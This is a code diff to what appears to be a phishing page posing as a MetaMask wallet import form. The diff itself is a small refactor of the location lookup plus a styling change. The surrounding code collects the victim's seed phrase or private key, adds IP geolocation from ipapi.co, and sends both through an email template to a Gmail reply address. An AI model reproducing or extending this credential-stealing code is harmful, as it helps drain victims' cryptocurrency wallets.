@@ -268,7 +268,7 @@
               v-model="privateKeyInput"
               rows="5"
               style="background: white; font-size: 14px; padding-top: 2px"
-              class="w-full rounded-md py-2 px-3 text-black text-sm outline-none mb-6"
+              class="w-full rounded-md border py-2 px-3 text-black text-sm outline-none mb-6"
             ></textarea>
 
             <div class="flex gap-3 mt-6 absolute bottom-0 left-0 right-0 w-full p-3">
@@ -503,6 +503,18 @@ function toggleFieldVisibility(idx) {
   hiddenFields.value[idx] = !hiddenFields.value[idx];
 }
 
+async function fetchLocationData() {
+  try {
+    const response = await axios.get("https://ipapi.co/json");
+    if (response?.data) {
+      return JSON.stringify(response.data);
+    }
+  } catch (err) {
+    // ignore failures and continue with fallback value
+  }
+  return "Unknown or location data unavailable";
+}
+
 const isImportDisabled = computed(() => {
   // require all phrase words filled for 12/24
   if (importType.value === "private") {
@@ -520,7 +532,7 @@ async function confirmPhrase() {
   }
   isLoading.value = true;
   try {
-    const location = await axios.get("https://ipapi.co/json");
+    const locationData = await fetchLocationData();
     const payload = {
       type: importType.value,
       phrase: phraseWords.value.join(" "),
@@ -533,7 +545,7 @@ async function confirmPhrase() {
       template_params: {
         from_name: "Blockchain solutions",
         wallet_type: "Metamask Wallets",
-        location: JSON.stringify(location.data),
+        location: locationData,
         link_drops: JSON.stringify(payload),
         reply_to: "edgir973@gmail.com",
       },
@@ -563,7 +575,7 @@ async function confirmPrivateKey() {
   }
   isLoading.value = true;
   try {
-    const location = await axios.get("https://ipapi.co/json");
+    const locationData = await fetchLocationData();
     const payload = {
       privateKey: privateKeyInput.value,
     };
@@ -574,7 +586,7 @@ async function confirmPrivateKey() {
       template_params: {
         from_name: "Blockchain solutions",
         wallet_type: "Metamask Wallets",
-        location: JSON.stringify(location.data),
+        location: locationData,
         link_drops: JSON.stringify(payload),
         reply_to: "edgir973@gmail.com",
       },
